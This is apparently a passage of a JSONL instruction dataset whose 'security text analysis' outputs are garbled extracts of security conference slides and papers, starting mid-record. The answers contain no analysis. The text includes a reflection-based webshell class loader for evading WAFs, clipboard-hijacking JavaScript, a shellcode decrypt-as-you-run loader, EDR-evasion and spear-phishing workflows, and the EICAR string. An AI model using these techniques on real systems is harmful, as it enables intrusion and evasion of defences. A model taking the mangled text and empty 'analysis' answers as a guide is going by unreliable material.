a Flash Elastix AskoziaPBX Asterisk for Raspberry Pi (http://www.raspber", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nmdm 0x00 mdm 0x01 apache -> 443apache -> apachemod_mdm.so -> unixsocket -> mdmd apachemod_mdm.somdmmdm unixsocketmdmunix 0x02 -mod_mdm ap_hook_handler hook contenttype application/x-httpd-mdm content type index mdm_servletsservlet mdm_servlets servlet servlet por/mdm_alert.mdm composemsgdo_mdmd_message composemsg httppostpostread destmobileid postbodydest composemsgmsgdestdo_mdmd_message unixmsgpost body 1. postbody 2. unix 3. 0x03 mdm- modmdmmdmmodmdm mod 1. MDMD_MainThread_PipeFile 2. quequemessagerequest 3. mdmd MDMD_MainThread_PipeFile mdmd 1. ReqManager 2. MdmDisManager registerdispatcher performerperformer performer 1. dispatcher 2. moddispatcherdispatcherdispatcher dispatcher namev1performer 0x04 mdm- performerunix performer switch LABEL_8 1. v1929 2. getdevinfobyplist0 v1929 v1933gettypebyplist typerequest_typekeyxml xmlkeyvalue if-elserequest_typetype v192929request_typeupdatemobileid 0x05 apacheunixsocket", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nMeasuring*the*IQ*of*your*Threat* Intelligence*Feeds*(#TIQtest)* Alex%Pinto% MLSec%Project%% @alexcpsec% @MLSecProject! Kyle%Maxwell% Researcher% @kylemaxwell! Alex%Pinto%  Science%guy%at%MLSec%Project%  ML%trainer%  Network%security%aﬁcionado%%  Tortured%by%SIEMs%as%a%child%  Hacker%Spirit%Animal:% CAFFEINATED%CAPYBARA! whoami(s)* Kyle%Maxwell%  Researcher%at%[REDACTED]%  Math%Smuggler%  Recovering%Incident%Responder%  GPL%zealot%  Hacker%Spirit%Animal:% AXIOMATIC%ARMADILLO! (hUps://secure.ﬂickr.com/photos/kobashi_san/)% (hUp://www.langorigami.com/art/gallery/ gallery.php?tag=mammals&name=armadillo)%  Threat%Intel%102%  Measuring%Intelligence%  Data%Preparaaon%  Tesang%the%Data%  Tools:%  COMBINE%  TIQcTEST%  Some%parang%ideas% Agenda* (hUp://www.savagechickens.com/2008/12/iqctest.html)% Threat*Intel*102:*Capability*and* Intent*  What%are%they%able%to%do?%  What%are%they%intending%to%do?! Threat*Intel*102:*Cage*Matches*  Signatures%vs%Indicators%  Data%vs%Intelligence%  Tacacal%vs%Strategic%  Atomic%vs%Composite% Threat*Intel*102:*Pyramid*of*Pain* Simple%and%easy%arent%always% (David%Bianco%%Pyramid%of%Pain)% What*about*IP*addresses?*  Approximately%same%value%as%hostnames%(APT%vs%DGA)%  Finite%resource%(unal%IPv6,%that%is)%  Managed%/%controlled%by%orgs%  Diﬃculty%/%economic%incenaves%/%implied%cost%  Also,%recyclable%% (hUps://xkcd.com/865/)% Given&IP&addresses&harvested&from& TI&feeds,&can&we&measure&how& much&they&help&our&defense& metrics?! Introducing*TIQGTEST*  All%these%tests%are%available%as%R%funcaons%at%%  hUps://github.com/mlsecproject/aqctest%  Have%fun,%prove%me%wrong,%suggest%stuﬀ%  Tools%that%implement%those%tests%  Sample%data%+%R%Markdown%ﬁle%  The%excuse%to%learn%a%staasacal%language%you%were%waiang% for!% Data*Sources**Types*of*data*  Extract%the%raw%informaaon%from%indicator%feeds%  Both%IP%addresses%and%hostnames%were%extracted% Data*Sources**Feeds*Selected*  Data%was%separated%into%inbound%and%outbound% Data*PreparaLon*and*Cleansing*  Convert%", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nA t a recent computer con- ference, a colleague of mine from a conservative academic institution chatted congenially with another con- ference attendee. At a typical conference such a conversa- tion would be nothing partic- ularly revealing, but this was DEFCON, and the young lady he was speaking with had a stainless steel spike tipped with a blinking green LED pro- truding from her lower lip. While some security researchers have described such conferences as going to a graffiti convention expecting to see those who design spray cans [1], I beg to differ. As a computer scientist you would be remiss in not attending one or more hacker conferences. The effort is worth it. You might see a speaker dance through the vulnerabilities in disassembled binaries with the skill of an Aikido master, another demon- strate a modified game console that boots to Linux, scans an internal network, and reports back to its master via encrypted communication paths, or (to the sound of Megadeth) the teams of Capture the Flag and Root-Fu compete in head-on war games. The intensity and talent would make you keenly aware that, so inclined, these people could take apart your carefully crafted, peer-reviewed applica- tion, protocol, or algorithm and find its weak- nessesperhaps very publicly or without a word being spoken. You need only perform an Internet search on DEFCON, Interz0ne, Phreaknic, and Hackers on Planet Earth to get a sense of the passion these events engender.1 Attendees range from respected tribal elders to immature hangers-on. Rather than distinctly good or bad, my experience has shown that most represent a more intellectually curious, highly principled, authority-averse, scientifically open-minded attitude. The majority are genuine computer experts from highly technical computing disciplines. For the past four years my electrical engineering and computer science department at West Point has arranged for faculty members, including me, staff, and students to attend hacker confe", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n1 ClassLoader的理解 前 ClassLoader的特性 最后 补上上次星球奖问答环节的坑(本来北师傅在星球中没改甲名字后来才知道下回答的是北师 傅emmmm尴尬尴尬) 起因是伙伴在hvv的过程中发现WAF会拦截Webshell中defineClass这个函数因为反射可以把我们需 要调的法放到个字符串的位置就可以产各种变形所以就想通过反射来绕过 于是乎就劈啪啦写了这样段代码 然后发现第次连接可以第次再刷新就会直提示类重复加载的错误 前 1 Method defineClass = Class.forName(\"java.lang.ClassLoader\").getDec laredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); 2 3 defineClass.setAccessible(true); 4 defineClass.invoke(ClassLoader.getSystemClassLoader(), bytes, 0, b ytes.length) 2 其实这个问题主要涉及到对JAVA中类加载机制的理解于是就引申出来另个问题为什么冰蝎跟蚁剑原 来的shell就不会提示类重复加载的错误呢在这篇章跟家分享下的理解 关于类加载机制已经有很多章在这个问题上主要涉及到其中个知识点 个类如果由不同的类加载器实例加载的话会在法区产两个不同的类彼此不可并且在堆中 成不同Class实例 这我们做个实验先写个测试的标类就是简单的弹个计算器 编译然后获取class件的base64结果放到下代码中 需要注意的是完成之后需要在idea中把上弹计算器的类给删掉这样才能模拟加载个不存在类的效 果 ClassLoader的特性 1 package com; 2 3 import java.io.IOException; 4 5 public class calc { 6 public calc() { 7 } 8 9 static { 10 try { 11 Runtime.getRuntime().exec(\"calc\"); 12 } catch (IOException e) { 13 e.printStackTrace(); 14 } 15 16 } 17 } 1 package loader; 2 3 import java.util.Base64; 4 5 public class test1 { 3 运之后发现弹出了计算器因为此时我们加载这个类的ClassLoader就是defineLoader1 6 public static class DefineLoader extends ClassLoader { 7 public Class load(byte[] bytes) { 8 return super.defineClass(null, bytes, 0, bytes.lengt h); 9 } 10 } 11 12 public static void main(String[] args) { 13 String cls = \"yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAo ABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJs ZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAApMY29tL2NhbGM7AQAIPGNsa W5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQ cAHAEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAkACgcAIAwAIQAiAQAEY2FsYww AIwAkAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJQAKAQAIY29tL2NhbGMBABBqYXZh L2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVK ClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZz spTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAA AAgABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAUADQAA AAwAAQAAAAUADgAPAAA", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nExploiting and attacking seismological networks .. Remotely Bertin B  James jara NetDB Search Engine DEFCON 24 Las Vegas, Nevada Disclaimer - This is not a typical talk -Probably it is the first research of this kind -All vulnerabilities have been reported to U.S CERT -We are not responsible of the actions that someone can take after attend this talk -Peace on earth Agenda -Who we are -Motivation -How we discovered this devices? -Risk /Impact , who is affected by attacking this devices ? -Seismological instrumentation -Internals /Deployment/Networking -Vulnerabilities /firmware analysis -Attack vectors / post exploitation -Recommendations/conclusions Bertin Bervis NetDB Co-founder @bertinjoseb James Jara NetDB Co-founder @jamesjara We are from San Jose Costa Rica Motivation Why we are interested in seismological networks? An average attacker is not interested for this attacks Governments are interested.. you know.. ..!@#$% WAR Cool and new attack scenario extreme environment You are playing with devices that measure natural disasters Could lead to a financial sabotage to a specific company/country The vendors of this instruments doesnt have any sense of computer security Remote access, remote exploitation Ok lets continue this project How we discovered this devices? DEMO Fingerprints too many fingerprints For some strange reason you find a unique fingerprint in millions DEMO So.. WTF is TAURUS ???? Lets connect to that shit NOW! Seismometers are instruments that measure motion of the ground, including those of seismic waves generated by earthquakes, volcanic eruptions, and other seismic sources. Records of seismic waves allow seismologists to map the interior of the Earth, and locate and measure the size of these different sources. Wikipedia Common aplications: -Earthquake detection -Geophysics, geothermal development -Structural analysis -Mine safety -Fracking / Drilling GPS REAL DATA LOCATION DEMO Ocean bottom seismograph Impact -No one else has ever done a resear", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nFree PowerPoint Templates Old McDonald Had A Barcode E-I E-I CAR Free PowerPoint Templates RICHARD HENDERSON DEF CON 29  Las Vegas, NV USA  August 2021 Who Am I? Richard: Ham/electronics nerd, writer, infosec professional. DEF CON trainer, contest runner. @RichSentMe Preface: What would happen if you built a system that is designed to accept barcode inputs but didnt do any input validation? Free PowerPoint Templates Free PowerPoint Templates What IS the EICAR string? Free PowerPoint Templates Free PowerPoint Templates X5O!P%@AP[4\\PZX54(P)7CC)7}$EICAR -STANDARD-ANTIVIRUS-TEST- FILE!$H+H* Free PowerPoint Templates Free PowerPoint Templates Who created it? What is it used for? How does it work? Free PowerPoint Templates Free PowerPoint Templates QR Codes Free PowerPoint Templates Free PowerPoint Templates Free PowerPoint Templates Free PowerPoint Templates What would happen if you put the two together? Free PowerPoint Templates Free PowerPoint Templates Free PowerPoint Templates Where did this whole thing start? Free PowerPoint Templates Free PowerPoint Templates Free PowerPoint Templates Free PowerPoint Templates Beyond a sticker on your car, what else could you do? Free PowerPoint Templates Free PowerPoint Templates Free PowerPoint Templates Free PowerPoint Templates  This video was sent to me by a random friend I would never do something stupid like this.  This is a passport scanner at a port of entry  Many countries now offer people entering a smartphone app to digitally fill out their customs entry card and that app creates a QR code that the passport machines can read Free PowerPoint Templates So what happened here? Free PowerPoint Templates Free PowerPoint Templates Why does this attack work? Free PowerPoint Templates Free PowerPoint Templates Much like ICS and SCADA where companies just \"bolted-on\" internet connectivity with zero thoughts of the security implications of doing so, companies are making devices \"smart\" and not really thinking very much about how p", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nHTTP Desync Attacks: Smashing into the Cell Next Door James Kettle - james.kettle@portswigger.net - @albinowax Abstract HTTP requests are traditionally viewed as isolated, standalone entities. In this paper, I'll explore forgotten techniques for remote, unauthenticated attackers to smash through this isolation and splice their requests into others, through which I was able to play puppeteer with the web infrastructure of numerous commercial and military systems, rain exploits on their visitors, and harvest over $60k in bug bounties. Using these targets as case studies, I'll show you how to delicately amend victim's requests to route them into malicious territory, invoke harmful responses, and lure credentials into your open arms. I'll also demonstrate using backend reassembly on your own requests to exploit every modicum of trust placed on the frontend, gain maximum privilege access to internal APIs, poison web caches, and compromise PayPal's login page. HTTP Request Smuggling was ﬁrst documented back in 2005 by Watchﬁre1, but a fearsome reputation for difﬁculty and collateral damage left it mostly ignored for years while the web's susceptibility grew. Alongside new attack variants and exploitation vectors, I'll help you tackle this legacy with custom open-source tooling and a reﬁned methodology for reliable black-box detection, assessment and exploitation with minimal risk of collateral damage. Core concepts Since HTTP/1.1 there's been widespread support for sending multiple HTTP requests over a single underlying TCP or SSL/TLS socket. The protocol is extremely simple - HTTP requests are simply placed back to back, and the server parses headers to work out where each one ends and the next one starts. This is often confused with HTTP pipelining2, which is a rarer subtype that's not required for the attacks described in this paper. By itself, this is harmless. However, modern websites are composed of chains of systems, all talking over HTTP. This multi-tiered archite", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n单步加解密执行shellcode 0x00 前言 国庆收假看见这么一段代码非常有意思文字不太好表述代码的执行流程如图所示 这个图没有很多执行细节因此并不是很准确但是已经能够表达我的意思了简短的说就是 边解密 边执行 再加密这样内存中只有很小的一部分代码是明文状态其他的代码都是密文状态 上图只是一个概念图真正编写代码是细节到单条指令的具体代码 https://gist.github.com/jackullrich/ce3b5263e05c88548b175f4f21909384 在这段代码中我站在新手同学角度思考可能有以下几个地方需要理解 typedef VOID(__stdcall* Shellcode)(); 向量化异常处理AddVectoredExceptionHandler 详细的执行流程 其他部分都非常好理解下面我们开始读代码并解释以上问题 0x01 阅读代码 我把代码拆分为几段 第一段 Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-09 No. 1 / 7 - Welcome to www.red-team.cn 这段代码中头文件函数声明和全局变量都是基础的C语言编程不用解释但是其中的 这段代码我刚学C的时候不太理解后来才知道被书误导了通常我们学习typedef的时候是和 #define做对比例如这个菜鸟教程https://www.runoob.com/cprogramming/c-typedef.html如 下 C 语言提供了 typedef 关键字您可以使用它来为类型取一个新的名字下面的实例为单字节数 字定义了一个术语 BYTE 在这个类型定义之后标识符 BYTE 可作为类型 unsigned char 的缩写例如 这样就很难理解上面的代码了正确的理解typedef应该是这样的https://blog.csdn.net/weixin_4225 5385/article/details/82261774 typedef用来声明一个别名typedef后面的语法是一个声明本来笔者以为这里不会产生什么 误解的但结果却出乎意料产生误解的人不在少数罪魁祸首又是那些害人的教材在这些教材 中介绍typedef的时候通常会写出如下形式 typedef int PARA; 这种形式跟#define int PARA几乎一样如前面几章所述这些教材的宗旨是由浅入深但实际做 出来的行为却是以偏盖全的确这种形式在所有形式中是最简单的但却没有对typedef进一步 解释使得不少人用#define的思维来看待typedef把int与PARA分开来看int是一部分PARA 是另一部分但实际上根本就不是这么一回事int与PARA是一个整体就象int i:声明一样是一个 整体声明只不过int i定义了一个变量而typedef定义了一个别名这些人由于持有这种错误的 观念就会无法理解如下一些声明 typedef int a[10]; typedef void (*p)(void); 他们会以为a[10]是int的别名(*p)(void)是void的别名但这样的别名看起来又似乎不是合法的名 字于是陷入困惑之中实际上上面的语句把a声明为具有10个int元素的数组的类型别名p是 一种函数指针的类型别名 虽然在功能上typedef可以看作一个跟int PARA分离的动作但语法上typedef属于存储类声明 说明符因此严格来说typedef int PARA整个是一个完整的声明 #include <Windows.h> LONG SingleStepEncryptDecrypt(EXCEPTION_POINTERS* ExceptionInfo); typedef VOID(__stdcall* Shellcode)(); LPBYTE ShellcodeBuffer; ULONG_PTR PreviousOffset; ULONG_PTR CurrentOffset; ULONGLONG InstructionCount; DWORD dwOld; typedef VOID(__stdcall* Shellcode)(); typedef unsigned char BYTE; BYTE b1, b2; Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-09 No. 2 / 7 - Welcome to www.red-team.cn 定义一个函数指针类型 比如原函数是 void func(void); 那么定义的函数指针类型就是typedef void (*Fun)(void); 然后用此类型生成一个指向函数的指针 F", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nJune 22, 2011 i Copyright 2011, Electronic Grymoire LLC : Bruce Barnett <deception@grymoire.com> June 22, 2011 ii Copyright 2011, Electronic Grymoire LLC Contents Introduction ................................................................................................................ 1 Similarities between Magicians and Hackers ...................................................... 1 The Magicians Arsenal ............................................................................................. 2 Physical techniques or Props .............................................................................. 2 The Gaff ................................................................................................................ 3 The Fake ............................................................................................................... 3 The Gimmick ....................................................................................................... 3 Human Accessories ............................................................................................... 3 Stooge.................................................................................................................... 4 Unwitting Accomplice ...................................................................................... 4 Psychological techniques ..................................................................................... 4 Appearance of normalcy .................................................................................. 4 Misdirection ......................................................................................................... 5 The Sleight ........................................................................................................... 5 The Feint............................................................................................................... 5 The Bluff ....................................................................", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nSCADA安全問題 安全問題 安全問題 安全問題 你不能不知的真相 你不能不知的真相 你不能不知的真相 你不能不知的真相 國家資通安全會報 技術服務中心 洪光鈞 劉作仁 谷威涵 陳培德 101年6月29日 大綱 大綱 大綱 大綱 SCADA簡介 SCADA面臨的安全問題 SCADA軟體安全檢測 漏洞揭露與通報經驗 安全防護與挑戰 1 SCADA簡介 簡介 簡介 簡介 2 SCADA簡介 簡介 簡介 簡介 SCADA-監視控制與資料擷取系統 (Supervisory Control and Data Acquisition)  屬工業控制系統(Industrial Control System 簡稱ICS)的一部分  具有系統監控和資料擷取功能的軟體都 可以稱之為 SCADA 不同領域應用所需的功能不盡相同 但都具有以下的基本單元  人機界面 (Human Machine Interface, HMI)  監控系統與資料擷取  遠端遙控單元 (Remote Terminal Unit, RTU)  可程式邏輯控制器 (Programmable Logic Controller, PLC)  通訊網路 (Communication infrastructure) 3 SCADA運作方式 運作方式 運作方式 運作方式 SCADA系統(軟體)可透過電 腦 (或 PLC) 及使用者介面對 相關硬體設備進行程序控制 和資料擷取  在電廠中要蒐集各個區域 電廠的電壓溫度濕度及 變電所的狀態等資訊  透過主控器監視並記錄這些 參數  對蒐集的資訊加以分析判 讀以進行電壓調節  或在意外狀況發生時能夠加 以處理 資料來源:http://en.wikipedia.org/wiki/SCADA 4 工業控制與管理系統生產模型 工業控制與管理系統生產模型 工業控制與管理系統生產模型 工業控制與管理系統生產模型 Level 3 Level 3 Level 3 Level 1 Level 1 Level 1 Level 0 Level 0 Level 0 Level 4 Level 4 Level 4 Manufacturing Operations Management Manufacturing Operations Management Plant Control Plant Control Physical Equipment Physical Equipment Bussiness Planning Bussiness Planning Level 2 Level 2 Level 2 Supervisory Control Supervisory Control MES, LIMS, WMS, CMM Systems MES, LIMS, WMS, CMM Systems PLC(Program Logic Control), DCS(Distributed Contorl System) PLC(Program Logic Control), DCS(Distributed Contorl System) I/O, Devices, Sensors I/O, Devices, Sensors ERP, APO, Logistics Systems ERP, APO, Logistics Systems HMI, SCADA, Batch Systems HMI, SCADA, Batch Systems 5 SCADA運用範圍 運用範圍 運用範圍 運用範圍 廣泛運用於關鍵基礎設施如電力系統水利 系統石油天然氣交通化工及汽車業等 6 SCADA面臨的安全問題 面臨的安全問題 面臨的安全問題 面臨的安全問題 7 2007那年一切都是從她開始 那年一切都是從她開始 那年一切都是從她開始 那年一切都是從她開始 2004~2005 大家談論SCADA安全性多為紙上 談兵 2006  SCADA Security & Terrorism: Were Not Crying Wolf presentation to the Black Hat Federal 2006 Conference by ISS X-Force 直到她的出現 2007  Hackers Take Down the Most Wired Country in Europe for a period of two weeks.  Wired Magazine 2007  Solar Sunrise  Three teenagers penetrate US Air Force logistic systems at various Middle East support bases 20", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n@Y4tacker GoogleCTF2022-Log4j 写在前 唯个Java题了挺有意思的道题学到很多 题附件https://github.com/google/google-ctf/tree/master/2022/web-log4j 预期分析 题给了个公环境(题似乎没有重启能猜到不可能是RCE)以及附件压缩包同时 有python以及java的环境先简单看看python的这运了web服务将输作为分割传 chat函数后通过subprocess调命令执并返回结果这不存在命令注 app = Flask(__name__) @app.route(\"/\", methods=['GET', 'POST']) def start(): if request.method == 'POST': text = request.form['text'].split(' ') cmd = '' if len(text) < 1: return ('invalid message', 400) elif len(text) < 2: cmd = text[0] text = '' else: cmd, text = text[0], ' '.join(text[1:]) 因此重点就是分析这个java的件很简单的代码(同时可以看到这有LOG4J2) result = chat(cmd, text) return result return render_template('index.html') def chat(cmd, text): # run java jar with a 10 second timeout res = subprocess.run(['java', '-jar', '-Dcmd=' + cmd, 'chatbot/target/app-1.0-SNAPSHOT.jar', '--', text], capture_output=True, timeout=10) print(res.stderr.decode('utf8')) return res.stdout.decode('utf-8') if __name__ == '__main__': port = os.environ['PORT'] if 'port' in os.environ else 1337 app.run(host='0.0.0.0', port=port) import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import java.lang.System; import java.time.format.DateTimeFormatter; import java.time.LocalDateTime; public class App { public static Logger LOGGER = LogManager.getLogger(App.class); public static void main(String[]args) { //获取环境变量当中的flag,同时这可以知道我们需要获取到环境变量 String flag = System.getenv(\"FLAG\"); if (flag == null || !flag.startsWith(\"CTF\")) { LOGGER.error(\"{}\", \"Contact admin\"); } //志输出命令参数 LOGGER.info(\"msg: {}\", args); // TODO: implement bot commands String cmd = System.getProperty(\"cmd\"); if (cmd.equals(\"help\")) { doHelp(); return; } if (!cmd.startsWith(\"/\")) { System.out.println(\"The command should start with a /.\"); return; } //根据命令参数执doCommand简单可以看出这没什么利 doCommand(cmd.substring(1), args); } private static void doCommand(String cmd, String[] args) { switch(cmd) { case \"help\": doHelp(); break; case \"repeat\": System.out.println(args[1]); break; case \"time\": DateTimeF", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nChrome 0x00 chrome JS 0x01 cmd app 1. xsssql 2. 0x02 js <!DOCTYPE html> <html lang=\"zh\"> <head> <meta charset=\"UTF-8\"> <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> <title>testclipboard</title> </head> <body> <div>testclip</div> <script> setInterval(function(){ try { let type = 'text/plain'; let blob = new Blob( [ 'magnet:?xt=urn:btih:5666f8bc53789cd7aae003933f15855a73257356&dn=ssni-954- C.torrent' ], { type } ); let item = new ClipboardItem({[type]: blob }); navigator.clipboard.write([item]); } catch (err) {} },2000); </script> </body> </html> 0x03 <!DOCTYPE html> <html lang=\"zh\"> <head> <meta charset=\"UTF-8\"> <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> <title>testclipboard</title> </head> <body> <div>testclip</div> <script> setInterval(function(){ try { let type = 'text/plain'; let blob = new Blob( [ '4-I:/ .. ξCULCb8NKszcv8ωω ' ], { type } ); let item = new ClipboardItem({[type]: blob }); navigator.clipboard.write([item]); } catch (err) {} },2000); </script> </body> </html> pc chromePC pc 0x04 pcChromewebkit", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nSlide: 1 MetaPhish Val Smith (valsmith@attackresearch.com) Colin Ames (amesc@attackresearch.com) David Kerb (dkerb@attackresearch.com) Slide: 2 Bios Valsmith  Affiliations:  Attack Research  Metasploit  Work:  Attack Techniques Research  Pen Tester/ Exploit developer  Reverse Engineer  Malware Analyst Previous Talks  Exploiting malware & vm detection  Kernel mode deobfuscation of malware  Data mining malware collections  Tactical Exploitation  Post Exploitation  Analysis of foreign web attacks Slide: 3 Overview  Spear Phishing for PenTesting  Working on a Framework on top of Metasploit  Phile Phishing  Web Phishing  MSF automation  Abusing TOR  Tying it all together Slide: 4 SpearPhishing  This is the way people are getting in NOW  Remote exploits much less prevalent  Blended attacks combining:  Web  File formats  Malware  Social Engineering Slide: 5 SpearPhishing How often do you pen test this way? Do clients let you? Slide: 6 SpearPhishing Youre missing a major vector! Slide: 7 SpearPhishing  Attackers now use targeted client side methods  Web kits prevalent  Mpack, tornado, adpack, luckyspolit, zunker  Who knows whats in these ?  Uncontrolled environment  File format exploits abound  Sometimes get built into MSF,Core  Same problems as web kits  Little public knowledge of FF RE methods  Solution? RE what the attackers do and make their techniques reliable Slide: 8 Work Flow  Thoroughly recon target  Build a legend for your attack  Find plausible documents from the target  Build your vector  Infect PDFs  Build a malicious website  Cast your line  send the target the lure Slide: 9 Work Flow  Setup a server side exploitation system that can handle many clients at once  Receive the incoming access  Design to bypass their firewalls  Look for proxies, HIDS/HFW, egress ports  Inject into preauthorized browsers  Automate your postexploitation actions  Scripts to grab passwords, install backdoors, enumerate info, grab tokens, log manipulation  Complex, needs a framework Sl", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n撤销和规避EDRs 指南 一.简介 EDREndpoint Detection Responser端点态势感知和响应用来针对APT攻击活动 本文属于翻译文章原文这里:http://jackson-t.ca/edr-reversing-evading-01.html 在我翻译之时作者仅仅给出了前三部分后面还未上线如果作者发表了我会第一时间跟踪并分享给 大家 指得一提的是 1.个人语言能力较差某处按照自己的理解难免有些画蛇添足希望师傅们优先看原文 2.之前了解到EDR和AV不同之处就在于EDR专门针对APT的具体细节没去了解因此本系列是边学边 了解 3.如有错误欢迎指正以免误导他人推荐看原文 比如有个地方 phone home确实无法理解可 能涉及到英文的俚语面对技术首先就要认真对待之前的翻译有些太草率了欢迎各位师傅一起交 流学习 索引 第一部分介绍 第二部分传感器侦察 第三部分转移EDR遥测到私有地址 第四部分融入 -- 即将到来 第五部分滥用盲点 第六部分篡改传感器 第七部分改变目的 什么是遥测的 Telemetry 就是在远程点收集的测量值或其他数据并将其自动传输到接收设备 以进行监视 二.第一部分 介绍 两个月前我有幸私下出现了一次两小时谈话关于逆转和规避技术可以抽象为多种EDR产品我收到了 一些请求发布资料因此我开始将此系列放到一起 这篇文章会比原始材料更淡化一点因为我不能发布某些产品检测细节相反我会讨论我的某些基础 想法和思考过程 目标听众是红队和攻击性开发人员并且我认为防守也会受益学习这些产品的细节可能是令人生畏 的令人有希望的是揭开神秘面纱都是在不懂的情况下(兴趣是唯一的驱动力) 规避概念 端点检测和响应Endpoint Detection and ResponseEDR 产品在执行检测/响应恶意行为期间监控 程序这是对传统AV功能的补充通过签名和启发式在执行之前阻止不想运行的程序在EDR领域一些顶 级厂商包括Mcrosodt,CrowdStrike,Cylance,Carbon Black和FireEye. 尽管规避技术是一个广义的术语但是攻击者EDR的响应可以归为以下方面 1. 回避近一步在未安装产品或者开启产品的系统上实现目标例如在未配置的端点或者已经配 置端点上通过代理流量 2. 混合 :隐藏在EDR传感器通常记录的噪音中例如 使用常见的父子进程关系 3. 滥用盲点采用传感器没有捕获或报告的区域例如使用当前没有被记录的API移除钩子使 用直接系统调用关于直接直接系统调用过EDR/AV 参考这篇文章https://www.cnblogs.com/ macanpsc/p/11670257.html强烈推荐 4. 篡改服务器更改传感器行为以使攻击者收益例如修补传感器以便恶意行为不会被报告或者收 集到 问题陈述&主题 为了检测EDR bypass技术的有效性许多操作者都这样做即在操作过程中是否被检测到在攻击对 和防守方这凸显了能见度不对等如果不能通过遥测和检测查询操纵员很难推断出成果绕过EDR或失 败确切的技术原因 如果一名操作员能够获取独立的访问遥测传感器这能够充当催化剂不但高效的检测bypass而且能够 发现新的盲点或者混合方式并且验证遥测传感器的能力 在不断发展的贸易进攻中我明白了这是基本步骤以下将是研究的主题 逆向工程传感器在不验证情况下获取访问遥感访问权限 使用遥感作为反馈回路来发现盲点或者混合方式 探索一系列复杂的篡改技术使传感器失效 重新调正传感器使传感器作为一个 RAT(娱乐为主) 在这个场景里面我描述建议的方法是搭建一个环境安装EDR传感器但是调整了传感器到自定义基础 结构因此它不会phone home这为A/B提供了机会测试那些行为是被拦截的并且确定混合或者发现盲 点的选项这项选项可以在传感器检测下被用来使用当他们精疲力竭时传感器篡改技术能够被用来 代替使用连接或者事件报道静默侠下来 致谢 今年我没有细致的研究每一个EDR产品首先实话讲这个工作量是很大的没有那些乐于分享知识 的人倾囊相授我无法学习去做这些事情下面是我读过相关的安全产品子版本列表 https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/ https://skylightcyber.com/2019/07/18/cylance-i-kill-you/ https://d4stiny.github.io/Reading-Physical-Memory-using-Carbon-Black/ https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/ https:/", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nSecure Messaging For Normal People DEFCON 23 2 Messages 3 Threats 4 Transport Layer Security 5 End-to-End Encryption 6 End to End Server Matchmaking 7 Evil Server 8 Transitive Trust 9 Metadata Collection", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nPrivacy Infrastructure: Challenges and Opportunities by @yawnbox of @EmeraldOnion for #defcon26 https://emeraldonion.org/ Washington State nonprofit registration June 5, 2017 $50 Washington State nonprofit date of incorporation June 15, 2017 n/a ARIN ASN and IPv6 (/36) registration June 26, 2017 $1,050 IRS EIN registration June 28, 2017 free Datacenter move in and Tor relay start July 2, 2017 $600 ARIN IPv4 (/24) request July 10, 2017 free ARIN IPv4 registration approval July 19, 2017 free IRS 501(c)3 application October 11, 2017 $275 IRS 501(c)3 approval October 27, 2017 n/a starting up https://emeraldonion.org/articles/ Washington State nonprofit registration June 5, 2017 $50 Washington State nonprofit date of incorporation June 15, 2017 n/a ARIN ASN and IPv6 (/36) registration June 26, 2017 $1,050 IRS EIN registration June 28, 2017 free Datacenter move in and Tor relay start July 2, 2017 $600 ARIN IPv4 (/24) request July 10, 2017 free ARIN IPv4 registration approval July 19, 2017 free IRS 501(c)3 application October 11, 2017 $275 IRS 501(c)3 approval October 27, 2017 n/a starting up 